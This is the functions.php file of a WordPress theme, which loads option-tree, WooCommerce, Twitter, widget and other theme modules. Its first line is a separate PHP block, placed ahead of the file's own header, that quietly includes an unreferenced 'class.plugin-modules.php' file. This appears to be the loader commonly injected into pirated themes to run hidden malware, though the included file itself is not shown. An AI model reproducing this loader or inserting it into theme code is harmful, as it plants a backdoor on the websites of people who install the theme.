<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?>
<?php
/*-----------------------------------------------------------------------------------

	Here we have all the custom functions for the theme
	Please be extremely cautious editing this file.
	You have been warned!

-------------------------------------------------------------------------------------*/

// Option-Tree Theme Mode
require get_theme_file_path('/option-tree/init.php');

// Theme Admin
require get_theme_file_path('/classes/fuelthemes.php');

// TGM Plugin Activation Class
require get_theme_file_path('/inc/admin/plugins/plugins.php');

// Misc
require get_theme_file_path('/inc/misc.php');

// Script Calls
require get_theme_file_path('/inc/script-calls.php');

// CSS Output of Theme Options
require get_theme_file_path('/inc/selection.php');

// Add Menu Support
require get_theme_file_path('/inc/wp3menu.php');

// Enable Sidebars
require get_theme_file_path('/inc/sidebar.php');

// Lazy Loading
require get_theme_file_path('/inc/framework/thb-lazyload.php');

// Post Likes
require get_theme_file_path('/inc/framework/thb-post-likes.php');

// Ajax
require get_theme_file_path('/inc/ajax.php');

// Portfolio Related
require get_theme_file_path('/inc/portfolio-related.php');

// Visual Composer Integration
require get_theme_file_path('/inc/framework/visualcomposer/visualcomposer.php');

// Instagram
require get_theme_file_path('/inc/framework/thb-instagram.php');

// Twitter oAuth
require get_theme_file_path('/inc/framework/thb-twitter-api.php');
require get_theme_file_path('/inc/framework/thb-twitter-helper.php');

// Widgets
require get_theme_file_path('/inc/widgets.php');

// WPML Support
require get_theme_file_path('/inc/wpml.php');

// WooCommerce Support
require get_theme_file_path('/inc/woocommerce.php');
require get_theme_file_path('/inc/woocommerce-category-image.php');

// Custom Post Types
require get_theme_file_path('post-types.php'); 